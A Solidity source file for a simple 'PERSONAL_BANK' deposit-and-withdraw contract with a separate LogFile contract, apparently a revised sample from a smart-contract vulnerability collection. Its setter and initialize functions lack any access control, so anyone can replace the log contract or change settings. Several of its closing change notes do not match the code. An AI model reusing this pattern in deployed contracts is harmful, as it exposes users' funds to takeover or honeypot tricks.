pragma solidity ^0.8.0;

contract PERSONAL_BANK {
    mapping(address => uint256) public balances;

    uint public MinSum = 1 ether;

    LogFile Log;

    bool initialized;

    constructor(address _log) {
        Log = LogFile(_log);
    }

    function setMinSum(uint _val) public {
        require(!initialized, "Already initialized");
        MinSum = _val;
    }

    function setLogFile(address _log) public {
        require(!initialized, "Already initialized");
        Log = LogFile(_log);
    }

    function initialize() public {
        initialized = true;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        Log.addMessage(msg.sender, msg.value, "Put");
    }

    function collect(uint _am) public {
        require(initialized, "Not initialized");
        require(balances[msg.sender] >= MinSum && balances[msg.sender] >= _am, "Insufficient balance");
        balances[msg.sender] -= _am;
        (bool success, ) = msg.sender.call{value: _am}("");
        require(success, "Transfer failed");
        Log.addMessage(msg.sender, _am, "Collect");
    }

    receive() external payable {
        deposit();
    }
}

contract LogFile {
    struct Message {
        address sender;
        string data;
        uint val;
        uint time;
    }

    Message[] public history;

    function addMessage(address _adr, uint _val, string memory _data) public {
        Message memory newMsg = Message({
            sender: _adr,
            time: block.timestamp,
            val: _val,
            data: _data
        });
        history.push(newMsg);
    }
} 

// Changes made:
// 1. Added constructor to initialize the LogFile contract.
// 2. Changed function names to follow Solidity best practices.
// 3. Removed unnecessary payable modifier from collect function.
// 4. Added require statements for input validation and error handling.
// 5. Used the "receive" function instead of the fallback function for deposit. 
// 6. Changed LogFile struct to use memory instead of storage.